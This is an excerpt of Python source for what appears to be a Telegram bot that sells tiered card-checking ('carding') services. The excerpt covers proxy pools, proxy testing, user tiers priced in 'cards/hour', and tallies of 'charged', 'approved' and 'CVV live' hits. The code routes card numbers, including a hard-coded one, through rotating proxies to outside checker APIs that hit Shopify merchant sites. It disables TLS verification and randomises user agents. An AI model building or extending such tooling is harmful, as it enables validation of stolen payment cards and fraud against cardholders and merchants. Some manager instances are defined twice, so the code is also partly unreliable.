            "success_rate": (working / total * 100) if total > 0 else 0,
            "proxies": self.user_proxies[user_id][:10],
            "main_api_proxies": main_api_count,
            "teamoicx_api_proxies": teamoicx_api_count
        }
    
    def reset_user_failed(self, user_id: int) -> bool:
        """Reset failed proxies list for a specific user"""
        if user_id in self.user_failed_proxies:
            self.user_failed_proxies[user_id].clear()
            print(f"🔄 Reset failed proxies list for user {user_id}")
            return True
        return False
    
    def get_active_proxy_count(self, user_id: int) -> int:
        """Get number of active (not failed) proxies for a user"""
        if user_id not in self.user_proxies:
            return 0
        total = len(self.user_proxies[user_id])
        failed = len(self.user_failed_proxies.get(user_id, set()))
        return total - failed
    
# ============ PROXY PRE-CHECKER ============
class ProxyPreChecker:
    """Pre-check proxies before using them in mass checks"""
    
    def __init__(self):
        self.working_proxies_cache = {}  # user_id -> list of working proxies
        self.failed_proxies_cache = {}   # user_id -> set of failed proxies
        self.last_check_time = {}        # user_id -> last check timestamp
        self.check_interval = 300        # Re-check every 5 minutes
        self.test_timeout = 10           # 10 seconds timeout for test
        self.max_concurrent_tests = 50   # Test up to 50 proxies at once
        
    async def test_single_proxy(self, proxy: str, user_id: int = None) -> Tuple[bool, float]:
        """
        Test a single proxy against PayPal API with a test card
        Returns: (is_working, response_time)
        """
        test_card = "4111111111111111|12|2025|123"  # Test card that will be declined
        test_amount = "1.00"
        
        try:
            start = time.time()
            
            # Format proxy
            formatted_proxy = format_proxy_for_paypal(proxy)
            if not formatted_proxy:
                print(f"❌ [Proxy Check] Invalid format: {mask_proxy(proxy)}")
                return False, 0
            
            # Make quick request with short timeout
            async with httpx.AsyncClient(
                timeout=httpx.Timeout(self.test_timeout, connect=5.0, read=8.0),
                verify=False,
                follow_redirects=True
            ) as client:
                response = await client.post(
                    PAYPAL_API_ENDPOINT,
                    json={"card": test_card, "amount": test_amount},
                    headers={"User-Agent": generate_user_agent()},
                    proxy=formatted_proxy
                )
            
            elapsed = time.time() - start
            
            # Check if we got ANY response (even declined means proxy works)
            if response.status_code == 200:
                try:
                    data = response.json()
                    # Any response (even error) means proxy is working
                    print(f"✅ [Proxy Check] Working: {mask_proxy(proxy)} ({elapsed:.1f}s)")
                    return True, elapsed
                except:
                    # JSON parse error but HTTP 200 means proxy works
                    print(f"✅ [Proxy Check] Working (HTTP 200): {mask_proxy(proxy)} ({elapsed:.1f}s)")
                    return True, elapsed
            else:
                print(f"❌ [Proxy Check] Failed (HTTP {response.status_code}): {mask_proxy(proxy)}")
                return False, elapsed
                
        except httpx.TimeoutException:
            print(f"⏰ [Proxy Check] Timeout: {mask_proxy(proxy)}")
            return False, 0
        except Exception as e:
            print(f"❌ [Proxy Check] Error: {mask_proxy(proxy)} - {str(e)[:50]}")
            return False, 0
    
    async def pre_check_user_proxies(self, user_id: int, force: bool = False) -> List[str]:
        """
        Pre-check all proxies for a user and return only working ones
        Results are cached for 5 minutes
        """
        now = time.time()
        
        # Check cache
        if not force and user_id in self.last_check_time:
            if now - self.last_check_time[user_id] < self.check_interval:
                # Return cached working proxies
                working = self.working_proxies_cache.get(user_id, [])
                print(f"📦 [Proxy Cache] Using cached {len(working)} working proxies for user {user_id}")
                return working
        
        # Get user's proxies
        user_proxies = proxy_manager.user_proxies.get(user_id, [])
        if not user_proxies:
            print(f"📋 [Proxy Check] No proxies found for user {user_id}")
            return []
        
        print(f"\n{'='*60}")
        print(f"🧪 [Proxy Pre-Check] Testing {len(user_proxies)} proxies for user {user_id}")
        print(f"{'='*60}")
        
        # Test proxies in parallel
        working_proxies = []
        failed_proxies = []
        proxy_speeds = {}
        
        # Use semaphore to limit concurrent tests
        semaphore = asyncio.Semaphore(self.max_concurrent_tests)
        
        async def test_with_semaphore(proxy):
            async with semaphore:
                is_working, speed = await self.test_single_proxy(proxy, user_id)
                return proxy, is_working, speed
        
        # Create tasks
        tasks = [test_with_semaphore(proxy) for proxy in user_proxies]
        
        # Wait for all tests to complete
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for result in results:
            if isinstance(result, Exception):
                continue
            proxy, is_working, speed = result
            if is_working:
                working_proxies.append(proxy)
                proxy_speeds[proxy] = speed
            else:
                failed_proxies.append(proxy)
        
        # Sort working proxies by speed (fastest first)
        working_proxies.sort(key=lambda p: proxy_speeds.get(p, 999))
        
        # Update user's proxy list - ONLY keep working proxies
        if working_proxies:
            # Replace user's proxies with only working ones
            proxy_manager.user_proxies[user_id] = working_proxies
            proxy_manager.user_formatted_proxies[user_id] = [format_proxy(p) for p in working_proxies]
            proxy_manager._save_user_proxies(user_id)
            
            # Also update the working proxies in the manager's tracking
            proxy_manager.user_failed_proxies[user_id] = set()  # Clear failed set since we removed bad ones
            
            print(f"\n✅ [Proxy Check] {len(working_proxies)}/{len(user_proxies)} proxies working")
            for i, p in enumerate(working_proxies[:5], 1):
                print(f"   {i}. {mask_proxy(p)} ({proxy_speeds[p]:.1f}s)")
            if len(working_proxies) > 5:
                print(f"   ... and {len(working_proxies) - 5} more")
        else:
            print(f"\n❌ [Proxy Check] All {len(user_proxies)} proxies FAILED!")
        
        # Update cache
        self.working_proxies_cache[user_id] = working_proxies
        self.failed_proxies_cache[user_id] = set(failed_proxies)
        self.last_check_time[user_id] = now
        
        return working_proxies
    
    async def get_working_proxy(self, user_id: int, force_recheck: bool = False) -> Optional[str]:
        """Get a single working proxy for a user (fastest one)"""
        working = await self.pre_check_user_proxies(user_id, force=force_recheck)
        if working:
            # Return the fastest proxy (first in list after sorting)
            return working[0]
        return None
    
    def clear_user_cache(self, user_id: int):
        """Clear cached results for a user"""
        self.working_proxies_cache.pop(user_id, None)
        self.failed_proxies_cache.pop(user_id, None)
        self.last_check_time.pop(user_id, None)

# Create global instance
proxy_pre_checker = ProxyPreChecker()
        
# ============ INITIALIZE MANAGERS HERE ============
# Create instances AFTER class definitions but BEFORE main()
user_manager = UserManager()
proxy_manager = ProxyManager()

async def mass_proxy_add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass add proxies to your personal pool - /massproxy <proxies>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if not user_manager.can_use_proxy(user_id):
        await update.message.reply_text("❌ Your tier doesn't support proxy usage.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "📦 <b>Mass Proxy Add</b>\n\n"
            "Usage: <code>/massproxy proxy1 proxy2 proxy3 ...</code>\n\n"
            "Examples:\n"
            "<code>/massproxy 219.100.37.85:28943 31.193.191.114:3128</code>\n"
            "<code>/massproxy user:pass@ip:port user2:pass2@ip2:port2</code>\n"
            "<code>/massproxy ip:port:user:pass ip2:port2:user2:pass2</code>\n\n"
            "Supported formats:\n"
            "• <code>ip:port</code>\n"
            "• <code>user:pass@ip:port</code>\n"
            "• <code>user:pass:ip:port</code>\n"
            "• <code>ip:port:user:pass</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get all proxies from args
    proxy_strings = " ".join(context.args).split()
    
    status_msg = await update.message.reply_text(
        f"📥 Adding {len(proxy_strings)} proxies to your pool..."
    )
    
    added = 0
    invalid = 0
    already_exists = 0
    
    for proxy in proxy_strings:
        # Try to add to user's personal pool
        if proxy_manager.add_user_proxy(user_id, proxy):
            added += 1
        else:
            # Check if it's invalid format or already exists
            # We can't easily distinguish, so we'll count as invalid
            invalid += 1
    
    result = (
        f"✅ <b>Mass Proxy Add Complete</b>\n\n"
        f"📊 <b>Results:</b>\n"
        f"   • Added: {added}\n"
        f"   • Failed/Skipped: {invalid}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🧪 Use /aptest test them"
    )
    
    await status_msg.edit_text(result, parse_mode=ParseMode.HTML, reply_markup=back_menu())

# ============ USER COMMANDS ============

async def tier_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show tier information and user stats"""
    if not await verify_group_access(update, context):
        return
        
    user = update.effective_user
    user_manager.update_user_info(user.id, user.username or "NoUsername", user.first_name)
    stats = user_manager.get_user_stats(user.id)
    
    msg = f"{stats['emoji']} <b>Your Account</b>\n\n"
    msg += f"🆔 ID: <code>{user.id}</code>\n"
    msg += f"👤 Username: @{user.username or 'N/A'}\n"
    msg += f"━━━━━━━━━━━━━━━━━━━\n"
    msg += f"🎯 <b>Tier: {stats['tier'].upper()}</b>{stats['expiry_text']}\n"
    msg += f"💰 Price: {stats['price']}\n"
    msg += f"━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📊 Total Checks: {stats['total_checks']}\n"
    msg += f"🎯 Total Hits: {stats['total_hits']}\n"
    msg += f"📈 Today: {stats['daily_checks']}/{stats['daily_limit'] if stats['daily_limit'] != float('inf') else '∞'}\n"
    msg += f"📦 Max Batch: {stats['batch_limit']}\n"
    msg += f"🔀 Concurrency: {stats['concurrency']}\n"
    msg += f"⏱️ Rate Limit: {stats['rate_limit']}s\n"
    msg += f"🔄 Proxy Access: {'✅' if stats['proxy_allowed'] else '❌'}\n"
    msg += f"📅 Joined: {stats['joined']}\n"
    msg += f"📌 Sites Added: {stats['sites_added']}\n"
    msg += f"━━━━━━━━━━━━━━━━━━━\n\n"
    
    msg += f"<b>📋 Available Tiers</b>\n\n"
    
    for tier, info in user_manager.TIERS.items():
        if tier == "admin" and user.id != OWNER_ID:
            continue
        current = "✅" if tier == stats['tier'] else "⭕"
        msg += f"{info['emoji']} {current} <b>{tier.upper()}</b>\n"
        msg += f"  • Daily: {info['max_checks_per_day'] if info['max_checks_per_day'] != float('inf') else '∞'}\n"
        msg += f"  • Batch: {info['max_batch_size']}\n"
        msg += f"  • Concurrency: {info['concurrency']}\n"
        msg += f"  • Proxy: {'✅' if info['can_use_proxy'] else '❌'}\n"
        msg += f"  • Direct Site Add: {'✅' if info.get('can_add_autosopi_sites', False) else '❌'}\n"
        msg += f"  • Speed: {TIER_SPEEDS.get(tier, 900)} cards/hour\n"
        msg += f"  • Price: {info['price']}\n\n"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())

async def set_tier_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set user tier (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    args = context.args
    if len(args) != 2:
        await update.message.reply_text(
            "Usage: /settier <user_id> <tier>\n"
            "Tiers: free, premium, ultimate, admin",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        target_id = int(args[0])
        tier = args[1].lower()
        
        if tier not in user_manager.TIERS:
            await update.message.reply_text(f"❌ Invalid tier. Choose: free, premium, ultimate, admin")
            return
        
        target_info = await context.bot.get_chat(target_id)
        username = target_info.username or "NoUsername"
        first_name = target_info.first_name or "User"
        
        if user_manager.set_tier(target_id, tier, update.effective_user.id):
            user_manager.update_user_info(target_id, username, first_name)
            stats = user_manager.get_user_stats(target_id)
            await update.message.reply_text(
                f"✅ {stats['emoji']} Set user {target_id} (@{username}) to {tier.upper()} tier\n"
                f"⚡ Speed: {TIER_SPEEDS.get(tier, 900)} cards/hour\n"
                f"🔀 Concurrency: {user_manager.TIERS[tier]['concurrency']}",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text("❌ Failed to set tier")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all users (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    users = user_manager.list_users()
    msg = "<b>📋 User List</b>\n\n"
    
    total_checks = sum(u["total_checks"] for u in users)
    total_hits = sum(u["total_hits"] for u in users)
    active_today = sum(1 for u in users if u["daily_checks"] > 0)
    total_sites = sum(u["sites_added"] for u in users)
    
    msg += f"📊 Total Users: {len(users)}\n"
    msg += f"📈 Total Checks: {total_checks}\n"
    msg += f"🎯 Total Hits: {total_hits}\n"
    msg += f"📅 Active Today: {active_today}\n"
    msg += f"📌 Total Sites Added: {total_sites}\n"
    msg += f"━━━━━━━━━━━━━━━━━━━\n\n"
    
    for user in users[:20]:
        emoji = user_manager.TIERS[user['tier']]['emoji']
        expiry = f" (expires: {datetime.fromtimestamp(user['tier_expiry']).strftime('%Y-%m-%d')})" if user['tier_expiry'] > 0 else ""
        speed = TIER_SPEEDS.get(user['tier'], 900)
        msg += f"{emoji} <b>{user['username']}</b>\n"
        msg += f"  🆔 {user['id']}\n"
        msg += f"  📊 {user['total_checks']} checks | 🎯 {user['total_hits']} hits\n"
        msg += f"  📈 Today: {user['daily_checks']}\n"
        msg += f"  🎯 {user['tier'].upper()}{expiry} | 📌 Sites: {user['sites_added']}\n"
        msg += f"  ⚡ Speed: {speed} cards/hour | ⏱️ Last: {user['last_active']}\n\n"
    
    if len(users) > 20:
        msg += f"... and {len(users) - 20} more users"
    
    if len(msg) > 4000:
        msg = msg[:4000] + "...\n(truncated)"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
    
# ============ INITIALIZE MANAGERS HERE ============
# Create instances AFTER class definitions but BEFORE main()
user_manager = UserManager()
proxy_manager = ProxyManager()

# ============ ADD THIS AFTER THE PROXY MANAGER INITIALIZATION ============
# Find this section in your code:
# proxy_manager = ProxyManager()
# Add this right after that line:

# ============ ENHANCED PROXY TESTING SYSTEM FOR AUTOSOPI ============

class AutosopiProxyTester:
    """Test proxies specifically against your APIs - DEV-KAMAL MAIN and BACKUP Shopify API"""
    
    def __init__(self):
        self.test_results = {}
        self.testing_lock = asyncio.Lock()
        self.api_endpoints = [
            {
                'name': 'MAIN API',
                'url': "http://dev-kamal.pw/shopi.php",
                'test_params': {
                    'cc': '5154620020027049|01|27|423',
                    'url': 'https://anseladams.org'
                }
            },
            {
                'name': 'BACKUP API',  # Changed from TEAMOICX to your Shopify API
                'url': "https://web-production-2dcc2.up.railway.app/shopify",
                'test_params': {
                    'cc': '5154620020027049|01|27|423',
                    'site': 'anseladams.org'
                }
            }
        ]
        
    async def test_proxy_with_apis(self, proxy: str, user_id: int = None) -> Tuple[Dict, Dict]:
        """
        Test a proxy against both APIs and return which APIs it works with
        """
        api_results = {
            'MAIN API': False,
            'BACKUP API': False  # Changed from TEAMOICX API
        }
        
        detailed_results = {
            'proxy': mask_proxy(proxy),
            'raw_proxy': proxy,
            'tests': {},
            'working_apis': [],
            'avg_response_time': 0,
            'best_api': None
        }
        
        total_time = 0
        working_count = 0
        
        # Format proxy for APIs
        formatted_proxy = format_proxy(proxy)
        if not formatted_proxy:
            print(f"❌ Invalid proxy format: {proxy[:30]}...")
            return api_results, detailed_results
        
        # Convert to main API format (host:port:user:pass)
        main_api_format = convert_to_devkamal_proxy_format(proxy)
        
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(35.0, connect=20.0, read=30.0),
            verify=False,
            limits=httpx.Limits(max_keepalive_connections=5, max_connections=10),
            follow_redirects=True
        ) as client:
            for api in self.api_endpoints:
                api_name = api['name']
                
                # Prepare test params based on API
                if api_name == 'MAIN API':
                    params = api['test_params'].copy()
                    url = api['url']
                    # MAIN API expects 'url' parameter
                    if main_api_format:
                        params['proxy'] = main_api_format
                        print(f"🔍 {api_name} testing format: {main_api_format[:50]}...")
                    else:
                        params['proxy'] = formatted_proxy
                        print(f"🔍 {api_name} testing format: {formatted_proxy[:50]}...")
                else:  # BACKUP API
                    params = {
                        'site': api['test_params']['site'],
                        'cc': api['test_params']['cc']
                    }
                    url = api['url']
                    # BACKUP API expects proxy in the same format
                    if main_api_format:
                        params['proxy'] = main_api_format
                        print(f"🔍 {api_name} testing format: {main_api_format[:50]}...")
                    elif formatted_proxy:
                        # Remove http:// prefix if present for backup API
                        clean_proxy = formatted_proxy.replace('http://', '')
                        params['proxy'] = clean_proxy
                        print(f"🔍 {api_name} testing format: {clean_proxy[:50]}...")
                
                api_success = False
                best_time = float('inf')
                best_format = None
                
                # Try different proxy formats for this API
                proxy_formats = []
                if main_api_format:
                    proxy_formats.append(main_api_format)
                if formatted_proxy:
                    clean_proxy = formatted_proxy.replace('http://', '')
                    proxy_formats.append(clean_proxy)
                if proxy:
                    proxy_formats.append(proxy)
                
                # Remove duplicates
                proxy_formats = list(dict.fromkeys(proxy_formats))
                
                for proxy_format in proxy_formats[:2]:  # Try first 2 formats
                    # Update params with current proxy format
                    if api_name == 'MAIN API':
                        params['proxy'] = proxy_format
                    else:
                        # For backup API, don't add http:// prefix
                        clean_format = proxy_format.replace('http://', '')
                        params['proxy'] = clean_format
                    
                    print(f"🔍 {api_name} testing format: {proxy_format[:50]}...")
                    
                    start_time = time.time()
                    
                    for attempt in range(2):  # 2 attempts per format
                        try:
                            current_timeout = 25.0 if attempt == 0 else 35.0
                            
                            # Make the request
                            if api_name == 'MAIN API':
                                response = await client.get(
                                    url,
                                    params=params,
                                    timeout=current_timeout
                                )
                            else:  # BACKUP API
                                response = await client.get(
                                    url,
                                    params=params,
                                    timeout=current_timeout
                                )
                            
                            elapsed = time.time() - start_time
                            
                            if response.status_code == 200:
                                try:
                                    data = response.json()
                                    
                                    if api_name == 'MAIN API':
                                        response_text = data.get('Response', '')
                                        # Check if proxy works (not proxy error)
                                        if 'Invalid proxy format' not in response_text and \
                                           'Proxy Dead' not in response_text and \
                                           'proxy error' not in response_text.lower() and \
                                           response_text.strip():
                                            
                                            api_success = True
                                            if elapsed < best_time:
                                                best_time = elapsed
                                                best_format = proxy_format
                                            
                                            print(f"✅ {api_name} - Working with format: {proxy_format[:30]} ({elapsed:.2f}s)")
                                            break  # Success, exit retry loop
                                        else:
                                            if attempt == 0:
                                                print(f"⚠️ {api_name} - Proxy format rejected, retrying...")
                                                await asyncio.sleep(2)
                                                continue
                                    else:  # BACKUP API
                                        # Check if we got a valid response (even if declined)
                                        status = data.get('Status')
                                        response_text = data.get('Response', '')
                                        
                                        # If we got any response (even error), the proxy is working
                                        if response_text and not 'proxy error' in response_text.lower():
                                            api_success = True
                                            if elapsed < best_time:
                                                best_time = elapsed
                                                best_format = proxy_format
                                            
                                            print(f"✅ {api_name} - Working with format: {proxy_format[:30]} ({elapsed:.2f}s)")
                                            break
                                        else:
                                            if attempt == 0:
                                                print(f"⚠️ {api_name} - Proxy format rejected, retrying...")
                                                await asyncio.sleep(2)
                                                continue
                                                
                                except json.JSONDecodeError:
                                    # Non-JSON but status 200 might still be working
                                    if response.status_code == 200:
                                        api_success = True
                                        if elapsed < best_time:
                                            best_time = elapsed
                                            best_format = proxy_format
                                        print(f"✅ {api_name} - Working (non-JSON) ({elapsed:.2f}s)")
                                        break
                            else:
                                if attempt == 0 and response.status_code >= 500:
                                    print(f"⚠️ {api_name} - HTTP {response.status_code}, retrying...")
                                    await asyncio.sleep(2)
                                    continue
                                    
                        except httpx.TimeoutException:
                            if attempt == 0:
                                print(f"⏰ {api_name} - Timeout, retrying...")
                                await asyncio.sleep(2)
                                continue
                        except Exception as e:
                            error_msg = str(e)
                            if attempt == 0:
                                print(f"⚠️ {api_name} - Error: {error_msg[:50]}, retrying...")
                                await asyncio.sleep(2)
                                continue
                    
                    if api_success:
                        break
                
                # Record results for this API
                api_results[api_name] = api_success
                if api_success:
                    working_count += 1
                    total_time += best_time
                    detailed_results['working_apis'].append(api_name)
                    detailed_results['tests'][api_name] = {
                        'working': True,
                        'response_time': best_time,
                        'format_used': best_format[:50] if best_format else 'unknown'
                    }
                else:
                    detailed_results['tests'][api_name] = {
                        'working': False,
                        'response_time': time.time() - start_time,
                        'error': 'All attempts failed'
                    }
        
        if working_count > 0:
            detailed_results['avg_response_time'] = total_time / working_count
            detailed_results['best_api'] = detailed_results['working_apis'][0] if detailed_results['working_apis'] else None
        
        return api_results, detailed_results
    
    async def test_user_proxies_thoroughly(self, user_id: int, progress_callback=None) -> Tuple[List[str], List[str], Dict]:
        """Test all proxies and assign them to API-specific pools"""
        if user_id not in proxy_manager.user_proxies or not proxy_manager.user_proxies[user_id]:
            return [], [], {}
        
        print(f"\n{'='*80}")
        print(f"🧪 TESTING PROXIES FOR USER {user_id} AGAINST YOUR APIS")
        print(f"📍 MAIN API: {DEV_KAMAL_API}")
        print(f"📍 BACKUP API: {BACKUP_SHOPIFY_API}")
        print(f"{'='*80}")
        
        working_proxies = []
        failed_proxies = []
        detailed_results = {}
        
        # Clear existing API-specific pools
        proxy_manager.user_main_api_proxies[user_id] = []
        proxy_manager.user_teamoicx_api_proxies[user_id] = []  # Keep for backward compatibility
        proxy_manager.user_backup_api_proxies = getattr(proxy_manager, 'user_backup_api_proxies', {})
        if user_id not in proxy_manager.user_backup_api_proxies:
            proxy_manager.user_backup_api_proxies[user_id] = []
        
        proxies = proxy_manager.user_proxies[user_id][:]
        
        for i, proxy in enumerate(proxies, 1):
            print(f"\n[{i}/{len(proxies)}] Testing proxy: {mask_proxy(proxy)}")
            
            if progress_callback:
                await progress_callback(f"🧪 Testing proxy {i}/{len(proxies)}: {mask_proxy(proxy)}")
            
            try:
                api_results, detailed = await self.test_proxy_with_apis(proxy, user_id)
                detailed_results[proxy] = detailed
                
                # Mark proxy for specific APIs
                for api_name, is_working in api_results.items():
                    if is_working:
                        if api_name == 'MAIN API':
                            proxy_manager.mark_proxy_for_api(user_id, proxy, 'MAIN API', True)
                        elif api_name == 'BACKUP API':
                            # Add to backup API pool
                            if user_id not in proxy_manager.user_backup_api_proxies:
                                proxy_manager.user_backup_api_proxies[user_id] = []
                            if proxy not in proxy_manager.user_backup_api_proxies[user_id]:
                                proxy_manager.user_backup_api_proxies[user_id].append(proxy)
                                print(f"✅ Proxy {mask_proxy(proxy)} added to BACKUP API pool")
                        
                        print(f"✅ Proxy {mask_proxy(proxy)} works with {api_name}")
                
                # Overall working status (works with at least one API)
                if any(api_results.values()):
                    working_proxies.append(proxy)
                    # Mark as success in proxy manager
                    formatted = format_proxy(proxy)
                    if formatted:
                        proxy_manager.mark_proxy_success_for_user(user_id, formatted)
                else:
                    failed_proxies.append(proxy)
                    formatted = format_proxy(proxy)
                    if formatted:
                        proxy_manager.mark_proxy_failure_for_user(user_id, formatted)
                    print(f"❌ Proxy {mask_proxy(proxy)} FAILED with all APIs")
                    
            except Exception as e:
                print(f"❌ Error testing proxy {mask_proxy(proxy)}: {e}")
                failed_proxies.append(proxy)
                detailed_results[proxy] = {'error': str(e)}
        
        # Save results
        proxy_manager.save_stats()
        
        print(f"\n{'='*80}")
        print(f"📊 TEST COMPLETE FOR USER {user_id}")
        print(f"✅ Working: {len(working_proxies)}")
        print(f"❌ Failed: {len(failed_proxies)}")
        print(f"📌 MAIN API proxies: {len(proxy_manager.user_main_api_proxies.get(user_id, []))}")
        print(f"📌 BACKUP API proxies: {len(proxy_manager.user_backup_api_proxies.get(user_id, []))}")
        print(f"{'='*80}")
        
        return working_proxies, failed_proxies, detailed_results


# ============ NEW COMMAND FOR ENHANCED PROXY TESTING ============

async def autosopi_proxy_test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test proxies using Autoshopify API - /aptest
    
    Tests your proxies against the Autoshopify API to find which ones work.
    Working proxies are automatically added to your pool.
    """
    
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if not user_manager.can_use_proxy(user_id):
        await update.message.reply_text("❌ Your tier doesn't support proxy usage.")
        return
    
    # Get user's proxies
    proxies = proxy_manager.user_proxies.get(user_id, [])
    if not proxies:
        await update.message.reply_text(
            "📋 You don't have any proxies to test.\n"
            "Use /addmyproxy <proxy> to add proxies first.\n\n"
            "Supported formats:\n"
            "• ip:port\n"
            "• user:pass@ip:port\n"
            "• user:pass:ip:port\n"
            "• ip:port:user:pass",
            parse_mode=ParseMode.HTML
        )
        return
    
    msg = await update.message.reply_text(
        f"🧪 <b>Testing {len(proxies)} proxies with Autoshopify API</b>\n\n"
        f"📍 API: Autoshopify (/aumc)\n"
        f"🔄 Testing each proxy...\n"
        f"This may take a moment.",
        parse_mode=ParseMode.HTML
    )
    
    # Start parallel testing
    asyncio.create_task(autosopi_proxy_test_parallel(update, context, proxies, msg))


async def autosopi_proxy_test_parallel(update: Update, context: ContextTypes.DEFAULT_TYPE, proxies: list, status_msg):
    """Parallel proxy testing using Autoshopify API"""
    user_id = update.effective_user.id
    
    print(f"\n{'='*80}")
    print(f"🧪 [APTEST] Testing {len(proxies)} proxies with Autoshopify API for user {user_id}")
    print(f"{'='*80}")
    
    # Test card (will be declined but tests proxy connectivity)
    test_card = "4111111111111111|12|2025|123"
    
    # Get a test site from Autosopi sites
    test_site = autosopi_site_manager.get_next_site_weighted()
    if not test_site:
        await status_msg.edit_text("❌ No test site available. Please add sites first using /submitsite")
        return
    
    print(f"📍 Using test site: {test_site}")
    
    # Clear existing API-specific pools
    proxy_manager.user_main_api_proxies[user_id] = []
    if not hasattr(proxy_manager, 'user_backup_api_proxies'):
        proxy_manager.user_backup_api_proxies = {}
    proxy_manager.user_backup_api_proxies[user_id] = []
    
    # Results tracking
    working_proxies = []
    failed_proxies = []
    proxy_results = {}
    proxy_speeds = {}
    
    # Statistics
    charged_count = 0
    approved_count = 0
    declined_count = 0
    
    # Create semaphore for concurrency
    semaphore = asyncio.Semaphore(50)  # Test up to 50 proxies concurrently
    results_lock = asyncio.Lock()
    
    total = len(proxies)
    completed = 0
    start_time = time.time()
    
    async def test_single_proxy(proxy: str, index: int):
        nonlocal completed, charged_count, approved_count, declined_count
        
        async with semaphore:
            masked = mask_proxy(proxy)
            is_working = False
            response_time = 0
            result_message = ""
            status_category = ""
            
            try:
                start = time.time()
                
                # Use the Autoshopify API to test the proxy
                result = await check_card_new_autosopi(
                    card=test_card,
                    site=test_site,
                    proxy=proxy,
                    user_id=user_id,
                    retry_count=0
                )
                
                response_time = time.time() - start
                
                # Check if proxy worked
                if result:
                    status_category = result.get("status_category", "")
                    result_message = result.get("message", "")
                    response_text = result.get("message", "").upper()
                    
                    # ============ DETERMINE IF PROXY IS WORKING ============
                    # These responses indicate the proxy is WORKING (got a response from API)
                    working_indicators = [
                        "DECLINED", "CARD DECLINED", "INSUFFICIENT", "FUNDS",
                        "CVV LIVE", "INCORRECT_CVV", "OTP", "3D", "SECURE",
                        "CHARGED", "ORDER COMPLETED", "SUCCESS", "PAID",
                        "APPROVED", "AUTHENTICATION", "RISK"
                    ]
                    
                    # These responses indicate the proxy is DEAD
                    dead_proxy_responses = [
                        "PROXY DEAD", "SITE DEAD", "CONNECTION ERROR",
                        "TIMEOUT", "INVALID PROXY", "PROXY AUTHENTICATION FAILED",
                        "FAILED TO CONNECT", "CONNECTION REFUSED"
                    ]
                    
                    is_dead = any(err in response_text for err in dead_proxy_responses)
                    
                    if not is_dead and any(ind in response_text for ind in working_indicators):
                        is_working = True
                        if "CHARGED" in response_text or "ORDER COMPLETED" in response_text:
                            charged_count += 1
                        elif "APPROVED" in response_text or "CVV LIVE" in response_text:
                            approved_count += 1
                        else:
                            declined_count += 1
                        print(f"✅ [{index}/{total}] {masked} - WORKING ({response_time:.1f}s) - {result_message[:50]}")
                    else:
                        print(f"❌ [{index}/{total}] {masked} - FAILED: {result_message[:50]}")
                else:
                    print(f"❌ [{index}/{total}] {masked} - No response")
                    
            except Exception as e:
                print(f"❌ [{index}/{total}] {masked} - Error: {e}")
                result_message = str(e)[:50]
            
            async with results_lock:
                completed += 1
                
                if is_working:
                    working_proxies.append(proxy)
                    proxy_speeds[proxy] = response_time
                    proxy_results[proxy] = result_message
                    
                    # Mark as success in proxy manager
                    if hasattr(proxy_manager, 'mark_proxy_success_for_user'):
                        proxy_manager.mark_proxy_success_for_user(user_id, proxy)
                    
                    # Add to API-specific pools
                    if user_id not in proxy_manager.user_main_api_proxies:
                        proxy_manager.user_main_api_proxies[user_id] = []
                    if proxy not in proxy_manager.user_main_api_proxies[user_id]:
                        proxy_manager.user_main_api_proxies[user_id].append(proxy)
                        print(f"✅ Proxy {masked} added to MAIN API pool")
                    
                    # Also add to backup pool
                    if user_id not in proxy_manager.user_backup_api_proxies:
                        proxy_manager.user_backup_api_proxies[user_id] = []
                    if proxy not in proxy_manager.user_backup_api_proxies[user_id]:
                        proxy_manager.user_backup_api_proxies[user_id].append(proxy)
                        print(f"✅ Proxy {masked} added to BACKUP API pool")
                        
                else:
                    failed_proxies.append(proxy)
                    proxy_results[proxy] = result_message
                    
                    # Mark as failed in proxy manager (will be removed)
                    if hasattr(proxy_manager, 'mark_proxy_failure_for_user'):
                        proxy_manager.mark_proxy_failure_for_user(user_id, proxy)
                
                # Update progress every 10 proxies or at completion
                if completed % 10 == 0 or completed == total:
                    elapsed = int(time.time() - start_time)
                    remaining = int((elapsed / completed) * (total - completed)) if completed > 0 else 0
                    progress = int((completed / total) * 10)
                    bar = "▓" * progress + "░" * (10 - progress)
                    
                    status_message = (
                        f"📊 Total: {total}\n"
                        f"✅ Working: {len(working_proxies)}\n"
                        f"❌ Failed: {len(failed_proxies)}\n"
                    )
                    
                    try:
                        await status_msg.edit_text(
                            status_message,
                            parse_mode=ParseMode.HTML
                        )
                    except:
                        pass
    
    # Create tasks for all proxies
    tasks = []
    for i, proxy in enumerate(proxies, 1):
        tasks.append(test_single_proxy(proxy, i))
    
    # Run all tasks with controlled concurrency
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # Save results
    proxy_manager.save_stats()
    
    elapsed = int(time.time() - start_time)
    
    # Sort working proxies by speed (fastest first)
    working_proxies_sorted = sorted(working_proxies, key=lambda p: proxy_speeds.get(p, 999))
    
    # Update user's proxy list to ONLY working proxies
    if working_proxies_sorted:
        proxy_manager.user_proxies[user_id] = working_proxies_sorted
        proxy_manager.user_formatted_proxies[user_id] = [format_proxy(p) for p in working_proxies_sorted]
        proxy_manager._save_user_proxies(user_id)
